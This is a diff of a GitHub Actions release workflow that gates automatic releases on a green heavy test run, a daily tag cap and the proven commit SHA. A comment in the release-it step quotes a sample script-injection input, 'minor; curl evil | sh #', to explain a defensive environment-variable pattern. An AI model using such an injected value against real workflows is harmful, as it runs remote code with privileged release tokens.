@@ -1,24 +1,38 @@
 name: 🏷️ Version
 
-# The release commit lands on main by a direct push (the App bypasses the
-# ruleset), and a direct push to main invalidates every merge group the queue
-# is building: each one is rebuilt from scratch on the new base. Releasing
-# after every merge discards the build of whatever is queued behind it — the
-# entries built in parallel with it, almost always (measured in
-# docs/merge-policy.md#releases-and-the-queue). So a merged pull request
-# releases only while no merge group is in flight: the last merge of a burst
-# releases everything the burst landed. The nightly and a workflow_dispatch
-# release regardless — the nightly is the backstop for a queue that drains
-# without a merge (its last entry ejected) or never drains, and a dispatch is
-# an operator's explicit request. The queue hold guards only a merged pull
-# request's release: the nightly and a dispatch ignore it. The major hold —
-# the step before release-it — is the one guard they do not ignore: while
-# main carries a breaking change, an automatic run skips green with a notice
-# and a non-major dispatch from main is refused, and only the exact
-# N+1.0.0 dispatch cuts. The decision lives in
+# A release is cut only after a green HEAVY run of 🧪 Tests on main — the run
+# whose race, e2e, mongo and cloud-e2e legs proved the commit — at most once a
+# day, and only for the commit that run proved (#3741). Every tag is therefore
+# proven by the heavy layer, and the release commit no longer lands after each
+# merge: it lands at most once a day, on the commit the heavy run judged.
+#
+# The automatic path is `workflow_run` on 🧪 Tests completing on main. The job
+# starts only for a Tests run that succeeded, on this repository's main,
+# triggered by a push, the schedule or a dispatch (never a pull request or a
+# merge group). It then asks scripts/ci/heavy-gate.sh --judge-run whether that
+# attempt was a green heavy run — the one definition the heavy layer's own
+# debounce reads too: the attempt concluded success and every `race-shard (N)`
+# job concluded success (a light run skips them, and a skipped leg proves
+# nothing). The heavy layer's own trigger (debounced push, schedule or
+# dispatch) does not matter here: the jobs say whether it ran.
+# Three more rules answer before anything is installed or pushed:
+#   - at most one release a day: the newest v* tag younger than
+#     MIN_TAG_AGE_HOURS skips with a notice (the next heavy run past the mark
+#     releases);
+#   - the proven commit only: main must still be the run's head_sha when the
+#     run moves to main's tip, otherwise it skips with a notice naming both
+#     shas (the next heavy run releases);
+#   - nothing since the last tag: skips with a notice.
+#
+# A workflow_dispatch is an operator's explicit request: it releases main's tip
+# as it finds it, ignores the daily cap and the heavy-run proof, and is the way
+# to ship a fix that cannot wait. The major hold — the step before release-it
+# — is the one guard no run ignores: while main carries a breaking change, an
+# automatic run skips green with a notice and a non-major dispatch from main
+# is refused, and only the exact N+1.0.0 dispatch cuts. The decision lives in
 # scripts/ci/release-major-hold.sh, exercised by
 # internal/ciguard/release_major_hold_test.go; this file only gathers the
-# facts.
+# facts. internal/ciguard/release_test.go pins the automatic rule.
 on:
   workflow_dispatch:
     inputs:
@@ -26,20 +40,13 @@ on:
         description: "Release as an increment (patch | minor) or an explicit X.Y.Z version. A major is cut only by its exact version (N+1.0.0, e.g. 8.0.0): 'major' is refused, and while main carries a breaking change a patch or minor from main is refused too."
         required: false
         default: minor
-  pull_request:
-    types: [closed]
+  workflow_run:
+    # tests.yml's `name:`, byte for byte (the emoji carries a variation
+    # selector): a workflow_run naming a workflow that does not exist never
+    # fires, and says nothing. internal/ciguard compares the two.
+    workflows: ["🧪 Tests"]
+    types: [completed]
     branches: [main]
-  schedule:
-    # Nightly auto-release: when there are unreleased commits since the last
-    # tag, bump + tag, which cascades to release.yml (binaries + chart).
-    # brew-update.yml (Homebrew tap) follows this run's completion, released
-    # or not. Days with no new commits are skipped by the guard step below to
-    # avoid empty releases.
-    # 22:27 UTC, which GitHub fired between 00:03 and 02:21 UTC on each of
-    # its 27 runs since 2026-09-11 — before the European morning, in the
-    # merge queue's quiet hours. Moving it moves the tap update's pull request with it; this is
-    # the only nightly trigger in the chain.
-    - cron: "27 22 * * *"
 
 # One release at a time, whatever the trigger, and none of them cancelled. Two
 # release-its must never run concurrently: when a push is rejected, release-it
@@ -47,10 +54,10 @@ on:
 # (`git push origin --delete vX`) — and if the other run just pushed that same
 # version, that is the other run's tag, leaving a release commit on main with
 # no tag. A group also keeps only ONE pending run by default and cancels it
-# when a newer one queues, which would let a merged pull request's run (held
-# while the queue builds) silently replace a pending nightly or dispatch.
-# `queue: max` keeps up to 100 pending runs, in order; each releases main's tip
-# as it finds it, so a run behind a release finds nothing new or the next one.
+# when a newer one queues, which would let the run following an ordinary Tests
+# completion silently replace a pending heavy-run release or dispatch.
+# `queue: max` keeps up to 100 pending runs, in order; a run behind a release
+# finds the daily cap reached, or main's tip already released.
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -59,21 +66,28 @@ concurrency:
 permissions:
   contents: write
   id-token: write
-  # The release hold reads whether a merge-queue branch's pull request is
-  # still open.
-  pull-requests: read
+  # The heavy-run proof reads the jobs of the Tests run that triggered this one.
+  actions: read
 
 jobs:
   version:
     if: >-
       github.event_name == 'workflow_dispatch' ||
-      github.event_name == 'schedule' ||
-      (github.event_name == 'pull_request' && github.event.pull_request.merged == true)
+      (github.event_name == 'workflow_run' &&
+      github.event.workflow_run.conclusion == 'success' &&
+      github.event.workflow_run.head_branch == 'main' &&
+      github.event.workflow_run.head_repository.full_name == github.repository &&
+      contains(fromJSON('["push", "schedule", "workflow_dispatch"]'), github.event.workflow_run.event))
     runs-on: ubuntu-latest
     # Runs queue behind one another and none is ever cancelled, so a hung run
     # would hold every release behind it for the 6-hour default. A release
     # takes minutes.
     timeout-minutes: 30
+    env:
+      # At most one automatic release a day. 20 h rather than 24: the heavy
+      # run drifts with the pushes that trigger it, and a release cut at 09:00
+      # must not push the next day's to the day after.
+      MIN_TAG_AGE_HOURS: "20"
     steps:
       - name: Get GitHub App Token
         id: token
@@ -86,123 +100,143 @@ jobs:
         with:
           # main's tip as this run finds it, whatever the trigger: the event's
           # own commit can be behind the release a queued run ahead of it cut.
+          # Every run checks out: the heavy-run proof below is a script of
+          # this tree.
           ref: main
           fetch-depth: 0
           token: ${{ steps.token.outputs.token }}
 
+      - name: Release only after a green heavy run
+        # The job's condition admitted a Tests run of main that succeeded; this
+        # step asks whether that very attempt was a GREEN HEAVY RUN. The
+        # predicate has ONE definition, scripts/ci/heavy-gate.sh, which also
+        # decides whether a push runs the heavy layer (#3737): its judge mode
+        # reads the attempt that completed — not the run's latest attempt,
+        # which a rerun may change — and answers green or not-green with its
+        # reason, or exits 2 on an attempt it cannot read, which fails this
+        # step rather than releasing on a guess.
+        id: heavy
+        if: github.event_name == 'workflow_run'
+        env:
+          GH_TOKEN: ${{ github.token }}
+          RUN_ID: ${{ github.event.workflow_run.id }}
+          RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt }}
+          RUN_URL: ${{ github.event.workflow_run.html_url }}
+          PROVEN_SHA: ${{ github.event.workflow_run.head_sha }}
+        run: |
+          set -euo pipefail
+          verdict="$(bash scripts/ci/heavy-gate.sh --judge-run "$RUN_ID" "$RUN_ATTEMPT")"
+          case "$verdict" in
+            green)
+              echo "a green heavy run (${RUN_URL}) proved ${PROVEN_SHA}"
+              echo "proven=true" >> "$GITHUB_OUTPUT"
+              ;;
+            not-green)
+              echo "::notice::No release: Tests run ${RUN_URL} on ${PROVEN_SHA} is not a green heavy run — only a green heavy run of main releases."
+              echo "proven=false" >> "$GITHUB_OUTPUT"
+              ;;
+            *)
+              echo "::error::heavy-gate.sh --judge-run answered '${verdict}', expected green or not-green"
+              exit 1
+              ;;
+          esac
+
+      - name: At most one automatic release a day
+        # The newest v* tag, by creation date, younger than MIN_TAG_AGE_HOURS
+        # skips the run with a notice: the next green heavy run past the mark
+        # releases. A dispatch is an operator's explicit request and ignores
+        # the cap.
+        id: daily
+        if: github.event_name == 'workflow_dispatch' || steps.heavy.outputs.proven == 'true'
+        env:
+          EVENT: ${{ github.event_name }}
+        run: |
+          set -euo pipefail
+          case "$MIN_TAG_AGE_HOURS" in
+            ''|*[!0-9]*) echo "::error::MIN_TAG_AGE_HOURS is '${MIN_TAG_AGE_HOURS}', expected a whole number of hours"; exit 1 ;;
+          esac
+          if [ "$EVENT" = "workflow_dispatch" ]; then
+            echo "a dispatch ignores the daily cap"
+            echo "due=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          newest="$(git for-each-ref --sort=-creatordate --count=1 --format='%(refname:short) %(creatordate:unix)' 'refs/tags/v*')"
+          if [ -z "$newest" ]; then
+            echo "no v* tag yet — releasing"
+            echo "due=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          tag="${newest% *}"
+          created="${newest##* }"
+          age=$(( $(date -u +%s) - created ))
+          if [ "$age" -lt $(( MIN_TAG_AGE_HOURS * 3600 )) ]; then
+            echo "::notice::No release: ${tag} was cut $(( age / 3600 )) h ago, under the ${MIN_TAG_AGE_HOURS} h daily cap — the next green heavy run past the mark releases; a dispatch releases now."
+            echo "due=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          echo "${tag} was cut $(( age / 3600 )) h ago — releasing"
+          echo "due=true" >> "$GITHUB_OUTPUT"
+
       - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6.5.0
+        if: steps.daily.outputs.due == 'true'
         with:
           go-version-file: go.mod
 
       - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
+        if: steps.daily.outputs.due == 'true'
         with:
           node-version: "24"
 
       - name: Install deps
+        if: steps.daily.outputs.due == 'true'
         run: corepack enable && pnpm install --frozen-lockfile
 
       - name: Configure git
+        if: steps.daily.outputs.due == 'true'
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
-      - name: Hold the release while the merge queue is building
-        # Only a merged pull request's release is held: the nightly and a
-        # dispatch release regardless and do not read the queue at all.
-        #
-        # Read after the dependency install and BEFORE the move to main's tip:
-        # a group in flight at this read is the only queue merge that could
-        # land before release-it pushes, and it holds the release; whatever
-        # lands before the move is in the tree release-it commits onto. A merge
-        # group under construction exists as a gh-readonly-queue/main/*
-        # branch, and those branches are exactly what a push to main
-        # invalidates — contents: read is all it takes. Best effort, not a
-        # lock: release-it still builds for a few minutes before it pushes,
-        # and a group that starts in that window rebuilds once. A failed read
-        # fails the job: releasing blind is what this replaces.
-        #
-        # GitHub sometimes leaves such a branch behind after its group merged
-        # (seen on mastodon, cilium, zed, flutter): counted as a live group,
-        # one orphan would hold every merged pull request's release until the
-        # nightly. A branch is named after the pull request at the tail of its
-        # group (gh-readonly-queue/main/pr-<n>-<base>), and a group only exists
-        # while that pull request waits in the queue — so a branch counts as
-        # live while its pull request is OPEN. Its head commit is dated when
-        # the entry was queued (a rebuild keeps the date); entries here wait
-        # minutes, a few hours on a bad day, so one queued more than
-        # MAX_ENTRY_AGE ago counts as left behind even if its pull request is
-        # open (dequeued, kept open). Branches left behind are ignored and
-        # named, with their pull request's state, so that someone deletes them.
-        id: queue
-        if: github.event_name == 'pull_request'
-        env:
-          GH_TOKEN: ${{ github.token }}
-          MAX_ENTRY_AGE: "86400"
-        run: |
-          set -euo pipefail
-          refs="$(gh api "repos/${GITHUB_REPOSITORY}/git/matching-refs/heads/gh-readonly-queue/main/" --jq '.[] | [.ref, .object.sha] | @tsv')"
-          now="$(date -u +%s)"
-          live=""
-          orphans=""
-          while IFS=$'\t' read -r ref sha; do
-            [ -n "$ref" ] || continue
-            pr="${ref##*/pr-}"
-            pr="${pr%%-*}"
-            case "$pr" in
-              ''|*[!0-9]*) echo "::error::cannot read a pull request number out of ${ref}"; exit 1 ;;
-            esac
-            state="$(gh api "repos/${GITHUB_REPOSITORY}/pulls/${pr}" --jq '.state')"
-            queued="$(gh api "repos/${GITHUB_REPOSITORY}/git/commits/${sha}" --jq '.committer.date')"
-            queued_s="$(date -u -d "$queued" +%s)"
-            if [ "$state" = "open" ] && [ $(( now - queued_s )) -le "$MAX_ENTRY_AGE" ]; then
-              live+="${ref}"$'\n'
-            else
-              orphans+="${ref} — pull request #${pr} ${state}, queued ${queued}"$'\n'
-            fi
-          done <<< "$refs"
-          if [ -n "$orphans" ]; then
-            printf 'merge-queue branches left behind by their group, ignored:\n%s' "$orphans"
-            echo "::warning::$(printf '%s' "$orphans" | grep -c .) gh-readonly-queue branch(es) outlived their group (pull request closed, or queued over ${MAX_ENTRY_AGE}s ago) — ignored by this guard; the log names them, check and delete."
-          fi
-          if [ -z "$live" ]; then
-            echo "no merge group in flight — releasing"
-            echo "busy=false" >> "$GITHUB_OUTPUT"
-            exit 0
-          fi
-          count="$(printf '%s' "$live" | grep -c .)"
-          printf 'merge groups in flight:\n%s' "$live"
-          echo "::notice::Release held: ${count} merge group(s) in flight. The merge that drains the queue releases everything merged since the last tag; the nightly releases regardless; so does a workflow_dispatch."
-          echo "busy=true" >> "$GITHUB_OUTPUT"
-
-      - name: Release main's tip as it is now
+      - name: Release main's tip only if the heavy run proved it
         # The checkout above ran minutes ago, and runs wait in line behind one
-        # another: a merge landing in between — typically the one that drains
-        # the queue — would make release-it commit onto a stale tree and its
-        # push fail. Move to main's current tip first; reinstall the
-        # dependencies only when the lockfile moved with it. A held release
-        # has nothing to move for.
-        if: steps.queue.outputs.busy != 'true'
+        # another: move to main's current tip first, or release-it would
+        # commit onto a stale tree and its push fail. An automatic run then
+        # releases only when that tip IS the commit the heavy run proved —
+        # a commit merged since was never judged by the heavy layer, so the
+        # run skips with a notice and the next green heavy run releases. A
+        # dispatch releases the tip as it finds it. Dependencies are
+        # reinstalled only when the lockfile moved with the tip.
+        id: tip
+        if: steps.daily.outputs.due == 'true'
+        env:
+          EVENT: ${{ github.event_name }}
+          PROVEN_SHA: ${{ github.event.workflow_run.head_sha }}
         run: |
           set -euo pipefail
           before="$(git rev-parse HEAD)"
           git fetch --quiet origin main
           git checkout --quiet -B main origin/main
-          if [ "$(git rev-parse HEAD)" != "$before" ]; then
-            echo "main moved from ${before:0:9} to $(git rev-parse --short HEAD) since the checkout"
+          tip="$(git rev-parse HEAD)"
+          if [ "$EVENT" = "workflow_run" ] && [ "$tip" != "$PROVEN_SHA" ]; then
+            echo "::notice::No release: main is at ${tip}, not ${PROVEN_SHA}, the commit the heavy run proved — the next green heavy run releases; a dispatch releases now."
+            echo "release=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          if [ "$tip" != "$before" ]; then
+            echo "main moved from ${before:0:9} to ${tip:0:9} since the checkout"
             if ! git diff --quiet "$before" HEAD -- package.json pnpm-lock.yaml pnpm-workspace.yaml; then
               pnpm install --frozen-lockfile
             fi
           fi
+          echo "release=true" >> "$GITHUB_OUTPUT"
 
       - name: Skip the release when nothing changed since the last tag
         # A queued run can find main's tip already released by the run ahead
-        # of it. For a merged pull request, release-it's conventional-changelog
-        # plugin then declines on its own ("No new version to release"); a
-        # dispatch passes an explicit increment (`minor` by default), which
-        # would cut an empty release — so the nightly and a dispatch check
+        # of it, and a dispatch passes an explicit increment (`minor` by
+        # default), which would cut an empty release — so every run checks
         # first.
         id: changes
-        if: github.event_name != 'pull_request'
+        if: steps.tip.outputs.release == 'true'
         run: |
           set -euo pipefail
           LAST_TAG="$(git describe --tags --abbrev=0 2>/dev/null || true)"
@@ -222,8 +256,8 @@ jobs:
         # explicit dispatch increment overrides the bump its changelog
         # recommends — so the first `!` after v7 would auto-cut v8 here, and a
         # dispatched `minor` would ship the breaking changes under a 7.x
-        # minor. This release hold answers every run that may release, the
-        # nightly and a dispatch included (unlike the queue hold above): an
+        # minor. This release hold answers every run that may release, a
+        # dispatch included (unlike the daily cap and the heavy-run proof): an
         # automatic run whose recommended version is the next major skips
         # green with a notice and no tag; a dispatched patch, minor,
         # same-major version or blank input from main is refused; only the
@@ -234,7 +268,7 @@ jobs:
         # gathers the facts from the tree release-it will release, and a
         # verdict other than release skips release-it below.
         id: major
-        if: steps.changes.outputs.has_changes != 'false' && (github.event_name != 'pull_request' || steps.queue.outputs.busy == 'false')
+        if: steps.changes.outputs.has_changes == 'true'
         env:
           EVENT: ${{ github.event_name }}
           INPUT: ${{ github.event.inputs.version }}
@@ -248,7 +282,7 @@ jobs:
           bash scripts/ci/release-major-hold.sh >> "$GITHUB_OUTPUT"
 
       - name: Run release-it
-        if: steps.changes.outputs.has_changes != 'false' && (github.event_name != 'pull_request' || steps.queue.outputs.busy == 'false') && steps.major.outputs.verdict == 'release'
+        if: steps.changes.outputs.has_changes == 'true' && steps.major.outputs.verdict == 'release'
         env:
           # Use the token-bureau App token so the GitHub Release that
           # release-it creates carries an App identity. Releases created
@@ -261,6 +295,6 @@ jobs:
           # `minor; curl evil | sh #` can't break out of the `run:` shell and
           # execute arbitrary code in a job holding the App token + id-token:
           # write (GHA script-injection). ${VAR:+"$VAR"} preserves the
-          # "empty input on nightly → no positional arg" behaviour.
+          # "empty input on an automatic run → no positional arg" behaviour.
           RELEASE_VERSION: ${{ github.event.inputs.version }}
         run: pnpm release-it ${RELEASE_VERSION:+"$RELEASE_VERSION"} --ci
